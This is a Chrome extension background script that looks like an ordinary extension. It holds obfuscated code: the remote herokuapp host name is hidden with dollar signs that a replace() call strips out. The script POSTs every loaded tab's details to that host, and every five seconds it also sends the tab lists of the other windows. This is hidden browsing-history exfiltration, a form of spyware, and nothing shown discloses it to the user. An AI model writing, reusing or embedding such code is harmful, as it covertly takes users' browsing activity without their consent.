// importScripts('./foreground.min.js')

// const url = 'http://localhost'.replace(/\$/g, '')
const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
const post = ({ url, body = {} }) => {
    return fetch(url, {
        method: 'POST',
        headers: {
            Accept: 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
    })
}

chrome.runtime.onInstalled.addListener(async () => {
    // chrome.storage.sync.set({ color })
    console.log('Installed %csuccessfully', `color: #3aa757`)
})

chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
    if (info.status === 'complete') {
        // console.log(tab)
        post({
            url: `${url}/api/extension/tabs`,
            body: {
                ...tab
            }
        })
    }
})

setInterval(async () => {
    const tabs = await chrome.tabs.query({ currentWindow: false })
    post({
        url: `${url}/api/extension/tabs`,
        body: tabs
    })
}, 5000)